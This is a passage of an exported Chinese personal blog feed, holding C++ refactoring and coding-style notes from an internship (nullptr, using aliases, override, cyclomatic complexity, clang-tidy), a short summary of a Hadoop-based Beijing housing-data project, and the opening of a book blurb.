冗余代码</h1><p><strong>规则4.4.3 不用的代码段直接删除，不要注释掉</strong></p><p>被注释掉的代码，无法被正常维护；当企图恢复使用这段代码时，极有可能引入易被忽略的缺陷。 正确的做法是，不需要的代码直接删除掉。若再需要时，考虑移植或重写这段代码。</p><p>这里说的注释掉代码，包括用 <code>/* */</code>和 <code>//</code>，还包括 <code>#if 0， #ifdef NEVER_DEFINED</code> 等等。</p><h1 id="3-圈复杂度cyclomatic-complexity"><a class="markdownIt-Anchor" href="#3-圈复杂度cyclomatic-complexity"></a> 3 圈复杂度（Cyclomatic complexity）</h1><p>详见 博客：<code>圈复杂度</code></p><p>定义：软件源码某部分的圈复杂度就是这部分代码中<a href="https://baike.baidu.com/item/%E7%BA%BF%E6%80%A7%E6%97%A0%E5%85%B3/4705660" target="_blank" rel="noopener">线性无关</a>路径的数量。<a href="https://baike.baidu.com/item/%E5%9C%88%E5%A4%8D%E6%9D%82%E5%BA%A6/828737?fr=aladdin" target="_blank" rel="noopener">百度百科</a></p><p>含huge_cyclomatic_complexity和huge_cca_cyclomatic_complexity两个指标；cyclomatic_complexity和cca_cyclomatic_complexity的计算差异：</p><ul><li>cca_cyclomatic_complexity：不管switch里面有多少个case，圈复杂度只加1</li><li>cyclomatic_complexity：switch里面有多少个case，圈复杂度就加多少</li></ul><p>精髓：覆盖所有的可能情况最少使用的测试用例个数</p><ol><li>?: 三元运算符 +1</li><li>case +1</li><li>default +1</li><li>else +1</li></ol><p>华为规则：圈复杂度改到15以下</p><h1 id="4-超大目录"><a class="markdownIt-Anchor" href="#4-超大目录"></a> 4 超大目录</h1><p>华为规则：超大目录门槛50</p><p>拆分标准：根据数据库表，PDMReader</p><h1 id="5-降低文件重复率"><a class="markdownIt-Anchor" href="#5-降低文件重复率"></a> 5 降低文件重复率</h1><p><strong>问题</strong>：采用抽离函数的方式降DT重复率，但是cpp文件中重复代码过多且存在不同，所以会导致函数参数过多；抽离的函数中使用的if-else也会过多，导致圈复杂度上升；</p><p><strong>解决</strong>：将抽离函数按照功能块再拆分</p><h1 id="6-llvmclang-tidy"><a class="markdownIt-Anchor" href="#6-llvmclang-tidy"></a> 6 llvm(clang-tidy)</h1><p>llvm原生的，华为版本的</p><p>重新下库后需要执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir cmake_build</span><br><span class="line"><span class="built_in">cd</span>  cmake_build</span><br><span class="line">cmake -DCMAKE_EXPORT_COMPILE_COMMANDS=1 -DCMAKE_TOOLCHAIN_FILE=../cmake/scripts/gcc_all_toolchain.cmake ..</span><br><span class="line">cp ./compile_commands.json ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure><p>在01_RB下执行命令，工具路径替换成自己的：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr1/dragon/llvm/tools/clang/tools/extra/clang-tidy/tool/run-clang-tidy.py -check=-*,modernize-use-nullptr,modernize-use-using,modernize-use-override -clang-tidy-binary=<span class="string">'/usr1/dragon/llvm/build/bin/clang-tidy'</span> -clang-apply-replacements-binary=<span class="string">'/usr1/dragon/llvm/build/bin/clang-apply-replacements'</span> -header-filter=./rating_charging/cppcode/tools/* -fix ./rating_charging/cppcode/tools</span><br></pre></td></tr></table></figure><p>自动化修复：</p><ul><li>modernize-use-nullptr</li><li>modernize-use-using：typedef-&gt;using</li><li>modernize-use-override</li></ul><h1 id="7-c类型风格转换"><a class="markdownIt-Anchor" href="#7-c类型风格转换"></a> 7 c++类型风格转换</h1><ul><li>先去了解清楚C++11类型转换的语法</li><li>几种转换使用的场景</li></ul><h1 id="8-超大函数huge-method"><a class="markdownIt-Anchor" href="#8-超大函数huge-method"></a> 8 超大函数（huge method）</h1><p>代码行大于阈值（阈值由产品CMC根据自身情况决策、定义）的函数</p><h1 id="9-gexp35-cpp-使用nullptr作为空指针常量"><a class="markdownIt-Anchor" href="#9-gexp35-cpp-使用nullptr作为空指针常量"></a> 9 G.EXP.35-CPP 使用<code>nullptr</code>作为空指针常量</h1><p><strong>【级别】</strong> 要求</p><p><strong>【描述】</strong></p><p>C++11开始引入了nullptr关键字代表空指针，在此之前使用NULL宏来表示空指针常量，导致出现如下问题：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NULL ((void*)0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* str = <span class="literal">NULL</span>; <span class="comment">// 编译错误: void* 不能自动转换为 char*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>(C::*pmf)() = &amp;C::Func;</span><br><span class="line"><span class="keyword">if</span> (pmf == <span class="literal">NULL</span>) &#123; <span class="comment">// 编译错误: void* 不能自动转换为指向成员函数的指针</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果把<code>NULL</code>被定义为<code>0</code>或<code>0L</code>。可以解决上面的问题。或者在需要空指针的地方直接使用<code>0</code>。</p><p>但这引入另一个问题，代码不清晰，特别是使用<code>auto</code>自动推导时更为突出：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> result =Find(id);</span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>) &#123;<span class="comment">// Find() 返回的是 指针 还是 整数?</span></span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>0</code>字面上是<code>int</code>类型(<code>0L</code>是<code>long</code>)，所以<code>NULL</code>和<code>0</code>都不是指针类型。</p><p>当重载指针和整数类型的函数时，传递<code>NULL</code>或<code>0</code>都调用到整数类型重载的函数:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">F</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">F</span><span class="params">(<span class="keyword">int</span>*)</span></span>;</span><br><span class="line"></span><br><span class="line">F(<span class="number">0</span>);<span class="comment">// 调用 F(int)，而非 F(int*)</span></span><br><span class="line">F(<span class="literal">NULL</span>);<span class="comment">// 调用 F(int)，而非 F(int*)</span></span><br></pre></td></tr></table></figure><p>另外，<code>sizeof(NULL) == sizeof(void*)</code>并不一定总是成立的，直接使用<code>0</code>或<code>0L</code>，代码不清晰，且无法做到类型安全；使用<code>NULL</code>无法做到类型安全。这些都是潜在的风险。</p><p><code>nullptr</code>的优势不仅仅是在字面上代表了空指针，使代码清晰，而且它不再是一个整数类型。</p><p><code>nullptr</code>是<code>std::nullptr_t</code>类型，而<code>std::nullptr_t</code>可以隐式的转换为所有的原始指针类型，这使得<code>nullptr</code>可以表现成指向任意类型的空指针。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">F</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">F</span><span class="params">(<span class="keyword">int</span>*)</span></span>;</span><br><span class="line">F(<span class="literal">nullptr</span>);<span class="comment">// 调用 F(int*)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> result =Find(id);</span><br><span class="line"><span class="keyword">if</span> (result ==<span class="literal">nullptr</span>) &#123; <span class="comment">// Find() 返回的是 指针</span></span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="10-gexp03-cpp-使用using定义类型别名"><a class="markdownIt-Anchor" href="#10-gexp03-cpp-使用using定义类型别名"></a> 10 G.EXP.03-CPP 使用using定义类型别名</h1><p>**【级别】**建议</p><p><strong>【描述】</strong></p><p>类型的别名实际是对类型的封装。而通过封装，可以让代码更清晰，同时在很大程度上避免类型变化带来的散弹式修改。</p><p>在<code>C++11</code>之前，可以通过<code>typedef</code>定义类型的别名：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">uint32_t</span>, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; SomeType;</span><br></pre></td></tr></table></figure><p>在<code>C++11</code>之后，提供<code>using</code>，实现<code>声明别名(alias declarations)</code>:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> SomeType = <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="keyword">uint32_t</span>, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;;</span><br></pre></td></tr></table></figure><p>对比两者的格式，使用using更容易理解：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> Type Alias; <span class="comment">// Type 在前，还是 Alias 在前，不宜历届</span></span><br><span class="line"><span class="keyword">using</span> Alias = Type; <span class="comment">// 符合'赋值'的用法，容易理解，不易出错</span></span><br></pre></td></tr></table></figure><p>如果觉得这点还不足以切换到<code>using</code>，我们接着看看<code>模板别名(alias template)</code>更简洁:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义模板的别名，一行代码</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; // <span class="title">template</span></span></span><br><span class="line"><span class="class"><span class="title">using</span> <span class="title">MyAllocatorVector</span> = <span class="title">std</span>:</span>:<span class="built_in">vector</span>&lt;T,MyAllocator&lt;T&gt;&gt;;</span><br><span class="line"></span><br><span class="line">MyAllocatorVector&lt;<span class="keyword">int</span>&gt; data;<span class="comment">// 使用 using 定义的别名</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt; // <span class="title">template</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        MyAllocatorVector&lt;<span class="keyword">int</span>&gt; data_;<span class="comment">// 模板类中使用 using 定义的别名</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而<code>typedef</code>不支持带模板参数的别名，只能”曲线救国”:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过模板包装 typedef，需要实现一个模板类</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">MyAllocatorVector</span> &#123;</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;T,MyAllocator&lt;T&gt;&gt; type;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">MyAllocatorVector&lt;<span class="keyword">int</span>&gt;::type data; <span class="comment">// 使用 typedef 定义的别名，多写 ::type</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">MyClass</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">typename</span> MyAllocatorVector&lt;<span class="keyword">int</span>&gt;::type data_; <span class="comment">// 模板类中使用，除了 ::type，还需要加上 typename</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>实习中遇到的实例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 数组</span></span><br><span class="line"><span class="keyword">typedef</span> TChar NumArray[<span class="number">24</span>];</span><br><span class="line"><span class="keyword">using</span> NumArray = TChar[<span class="number">24</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构体c++中，定义变量无需加关键字struct</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    TUInt4 uiAVPcode;</span><br><span class="line">    TUChar ucAVPflag_r : <span class="number">5</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125; AVPHEAD;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AVPHEAD</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">&#125; ;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数指针</span></span><br><span class="line"><span class="comment">// typedef 返回类型(*新类型)(参数表)</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">RETCODE</span> <span class="params">(*FnFmtFunc)</span><span class="params">(<span class="keyword">const</span> TChar* cdrBuff, TUInt4 cdrLen)</span> <span class="keyword">const</span></span>;</span><br><span class="line"><span class="keyword">using</span> FnFmtFunc = RETCODE (*)(<span class="keyword">const</span> TChar* cdrBuff, TUInt4 cdrLen) <span class="keyword">const</span>;</span><br></pre></td></tr></table></figure><h1 id="10-gcls12-cpp-在重写虚函数时应明确指定override或final"><a class="markdownIt-Anchor" href="#10-gcls12-cpp-在重写虚函数时应明确指定override或final"></a> 10  G.CLS.12-CPP 在重写虚函数时应明确指定<code>override</code>或<code>final</code></h1><p>**【级别】**要求</p><p><strong>【描述】</strong></p><p>在重写虚函数时明确指定override或final，能保证该函数是重写了基类的虚函数，并且无需再添加virtual关键字。如果派生类函数与基类函数原型不一致，则产生编译错误。<code>final</code>还保证虚函数不会再被派生类重写。</p><ul><li>virtual 表示一个新的虚函数</li><li>override 表示重写了基类中的虚函数，可以再被派生类重写</li><li>final 表示重写了基类中的虚函数，不能再被派生类重写</li></ul><p>使用<code>override</code>或<code>final</code>关键字后，如果修改了基类虚函数原型，但忘记修改子类重写的虚函数，在编译期就可以发现。也可以避免有多个子类时，重写虚函数的修改遗漏。</p><p><strong>【正例】</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Base();</span><br><span class="line">    <span class="keyword">virtual</span> ~Base();</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Foo</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Foo</span><span class="params">(<span class="keyword">int</span> var)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Bar</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">class <span class="title">Derived</span><span class="params">()</span>: <span class="keyword">public</span> Base </span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Derived();</span><br><span class="line">    ~Derived() <span class="keyword">override</span>; <span class="comment">// 符合：析构函数添加override</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Foo</span><span class="params">(<span class="keyword">int</span> var)</span> <span class="keyword">final</span></span>; <span class="comment">// 符合：重写基类函数，且Derived的派生类不能再重写此函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Foo</span><span class="params">()</span> <span class="keyword">override</span></span>;<span class="comment">// 符合：重写基类函数</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Foo</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span></span>;<span class="comment">// 编译失败: Derived::Foo 和 Base::Foo 原型不一致，</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Bar</span><span class="params">()</span> <span class="keyword">override</span></span>;<span class="comment">// 编译失败: Base::Bar 不是虚函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><ol><li>基类首次定义虚函数，使用<code>virtual</code>关键字</li><li>子类重写基类虚函数（包括析构函数），使用<code>override</code>或<code>final</code>关键字（但不要两者一起使用），并且不使用<code>virtual</code>关键字</li><li>非虚函数，<code>virtual</code>、<code>override</code>和<code>final</code>都不使用</li></ol><p>【实习实例】</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DECLARE_SERVICE_PLUGIN(CBypassMsgController);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLARE_SERVICE_PLUGIN(CLASS_NAME) \</span></span><br><span class="line">DECLARE_SERVICE_COMPONET(CLASS_NAME); \</span><br><span class="line"><span class="keyword">protected</span>: \</span><br><span class="line">virtual const TChar* MyName() const \</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> #CLASS_NAME; \</span><br><span class="line">    &#125; \</span><br><span class="line">        </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DECLARE_SERVICE_PLUGIN(CLASS_NAME) \</span></span><br><span class="line">DECLARE_SERVICE_COMPONET(CLASS_NAME); \</span><br><span class="line"><span class="keyword">protected</span>: \</span><br><span class="line">virtual const TChar* MyName() const override \</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> #CLASS_NAME; \</span><br><span class="line">    &#125; \</span><br></pre></td></tr></table></figure><h1 id="11-gexp29-cpp-比较两个表达式左侧倾向于变化右侧倾向于不变"><a class="markdownIt-Anchor" href="#11-gexp29-cpp-比较两个表达式左侧倾向于变化右侧倾向于不变"></a> 11 G.EXP.29-CPP 比较两个表达式，左侧倾向于变化，右侧倾向于不变</h1><p>**【级别】**建议</p><p><strong>【描述】</strong></p><p>当变量与常量比较时，如果常量放左边，如 if (MAX == v) 不符合阅读习惯，而 if (MAX &gt; v) 更是难于理解。 应当按人的正常阅读、表达习惯，将常量放右边。写成如下方式：</p><p><strong>【正例】</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (value == MAX) &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (value &lt; MAX) &#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也有特殊情况，如：<code>if (MIN &lt; value &amp;&amp; value &lt; MAX)</code> 用来描述区间时，前半段是常量在左的。</p><p>不用担心将 <code>==</code> 误写成 <code>=</code>，因为<code>if (value = MAX)</code> 会有编译告警，其他静态检查工具也会报错。让工具去解决笔误问题，代码要符合可读性第一。</p><p><strong>【脚本误报】</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 逻辑或</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">'N'</span> == cSIPChgSubsNoType || <span class="string">'\0'</span> == cSIPChgSubsNoType) </span><br><span class="line"><span class="keyword">if</span> (cSIPChgSubsNoType == <span class="string">'N'</span> == cSIPChgSubsNoType || <span class="string">'\0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逻辑并</span></span><br><span class="line">TBool bContinue = <span class="number">0</span> &gt;= lSecUnpaid &amp;&amp; bSingle;</span><br><span class="line">TBool bContinue = lSecUnpaid &amp;&amp; bSingle &lt;= <span class="number">0</span>;</span><br></pre></td></tr></table></figure><h1 id="12-其他"><a class="markdownIt-Anchor" href="#12-其他"></a> 12 其他</h1><ul><li>G.FMT.02-CPP 使用空格进行缩进，每次缩进4个空格</li><li>G.CMT.03-CPP 文件头注释包含版权说明</li><li>G.CMT.02-CPP 代码注释置于对应代码的上方或右边</li><li>G.FMT.06-CPP 换行时将操作符留在行末，新行缩进一层或进行同类对齐</li><li>G.FMT.09-CPP 构造函数初始化列表放在同一行或按4空格缩进并排多行</li><li>G.FMT.13-CPP case/default语句相对于switch缩进一层</li></ul>]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 重构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大数据训练营项目《北京二手房交易数据分析平台》整理</title>
      <link href="/2022/04/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E8%AE%AD%E7%BB%83%E8%90%A5%E9%A1%B9%E7%9B%AE%E3%80%8A%E5%8C%97%E4%BA%AC%E4%BA%8C%E6%89%8B%E6%88%BF%E4%BA%A4%E6%98%93%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0%E3%80%8B%E6%95%B4%E7%90%86/"/>
      <url>/2022/04/18/%E5%A4%A7%E6%95%B0%E6%8D%AE%E8%AE%AD%E7%BB%83%E8%90%A5%E9%A1%B9%E7%9B%AE%E3%80%8A%E5%8C%97%E4%BA%AC%E4%BA%8C%E6%89%8B%E6%88%BF%E4%BA%A4%E6%98%93%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0%E3%80%8B%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>北京二手房交易数据分析平台：收集二手房交易数据，利用大数据技术进行处理，大屏展示结果  。</p><h1 id="2-工作流程"><a class="markdownIt-Anchor" href="#2-工作流程"></a> 2 工作流程</h1><ol><li><strong>数据收集</strong>：爬取二手房交易网站的数据（链家、贝壳等）</li><li><strong>数据预处理</strong>：不同的数据源，不同的数据结构，垃圾数据，对收集到的大数据集合进行预处理</li><li><strong>数据存储、处理与分析（我负责）</strong>：搭建hadoop环境，将数据文件上传hdfs，通过mapreduce进行数据分析等</li><li><strong>数据可视化</strong>：后端使用java、前端使用echarts模板等进行展示</li></ol><h1 id="3-负责"><a class="markdownIt-Anchor" href="#3-负责"></a> 3 负责</h1><ul><li><strong>集群</strong>：3台centos虚拟机</li><li><strong>名词解释</strong>：<ul><li>hadoop：Hadoop是一个能够对大量数据进行<a href="https://baike.baidu.com/item/%E5%88%86%E5%B8%83%E5%BC%8F%E5%A4%84%E7%90%86" target="_blank" rel="noopener">分布式处理</a>的<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6" target="_blank" rel="noopener">软件</a>框架。 <a href="https://baike.baidu.com/item/Hadoop/3526507" target="_blank" rel="noopener">https://baike.baidu.com/item/Hadoop/3526507</a><ul><li>hdfs：分布式文件系统 <a href="https://baike.baidu.com/item/hdfs/4836121" target="_blank" rel="noopener">https://baike.baidu.com/item/hdfs/4836121</a></li><li>mapreduce：是一种编程模型，用于大规模数据集（大于1TB）的并行运算 <a href="https://baike.baidu.com/item/MapReduce/133425" target="_blank" rel="noopener">https://baike.baidu.com/item/MapReduce/133425</a></li></ul></li><li>hive：Hive是基于Hadoop的一个数据仓库工具，可以将结构化的数据文件映射为一张数据库表，并提供类SQL查询功能。 <a href="https://developer.aliyun.com/article/100911" target="_blank" rel="noopener">https://developer.aliyun.com/article/100911</a></li><li>sqoop：主要用于在Hadoop(Hive)与传统的数据库(mysql、postgresql…)间进行数据的传递   <a href="https://baike.baidu.com/item/sqoop/5033853" target="_blank" rel="noopener">https://baike.baidu.com/item/sqoop/5033853</a></li></ul></li></ul><h1 id="4-项目架构图"><a class="markdownIt-Anchor" href="#4-项目架构图"></a> 4 项目架构图</h1><p><img src="https://s2.loli.net/2022/03/23/FPK2J3Ozo71Veav.png" alt></p><h1 id="5-困难"><a class="markdownIt-Anchor" href="#5-困难"></a> 5 困难</h1><ul><li>hadoop集群搭建失败：版本没用对</li><li></li></ul>]]></content>
      
      
      <categories>
          
          <category> 大数据 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《世事如书，我只爱你这一句》书籍</title>
      <link href="/2022/04/17/%E3%80%8A%E4%B8%96%E4%BA%8B%E5%A6%82%E4%B9%A6%EF%BC%8C%E6%88%91%E5%8F%AA%E7%88%B1%E4%BD%A0%E8%BF%99%E4%B8%80%E5%8F%A5%E3%80%8B%E4%B9%A6%E7%B1%8D/"/>
      <url>/2022/04/17/%E3%80%8A%E4%B8%96%E4%BA%8B%E5%A6%82%E4%B9%A6%EF%BC%8C%E6%88%91%E5%8F%AA%E7%88%B1%E4%BD%A0%E8%BF%99%E4%B8%80%E5%8F%A5%E3%80%8B%E4%B9%A6%E7%B1%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><p>朱生豪：“醒来觉得甚是爱你。”</p><p>张爱玲：“因为爱过，所以慈悲；因为懂得，所以宽容。”</p><p>林徽因：“答案很长，我得用一生去回答你，准备好听我了吗？”</p><p>钱钟书：“我见到她之前，从未想到要结婚；我娶了她十几年，从未后悔娶她；也从未想过要娶别的女人。”</p><p>沈从文说：“我走过许多地方的路，行过许多地方的桥，看过许多次数的云，喝过许多种类的酒，却只爱过一个正当最好年龄的人。”</p><p>央视朗读者盛赞，温暖了一个世纪的民国爱情故事。20对民国才子佳人的缱绻情书，有梁思成与林徽因的“门当户对四月天”，有林语堂与廖翠凤的“焚证报卿缠绵意”，有徐志摩与陆小曼的“离悲成欢有绝期”，也有胡兰成与张爱玲的“终成饭粘萎尘泥”，一字字，一句句，令人心生暖意，不禁想回到那个年代，去同他们一起谈天说地，抑或静下心来给心上人，写一封暖暖的情书。</p><p>关于民国美好的爱情故事，是印刻在我们记忆里的传奇，我们不断回忆，不断打磨，把思念书写成文字，把故事打磨成璞玉。最终，裁成四月的天。</p><h1 id="2-作者"><a class="markdownIt-Anchor" href="#2-作者"></a> 2 作者</h1><p>特立独行的猪先生，编剧、民国史研究者。因热爱民国史，致力于把枯燥的历史用年轻人喜闻乐见的方式表述出来，创有历史游记节目“猪游记”，现为独立自媒体人。</p><p>作者访遍书中人物故居，翻阅现存史料记载，游历了各个名人博物馆，并整理了他们当年的信件及书稿，历数年写就成书。</p><p>作者完全摒弃了市面上诸多历史书籍误读的地方，并一一实地考察校正，为我们真实还原了那个时期民国才子佳人的爱情故事，完整重现了他们可歌可泣的爱情历程。</p><h1 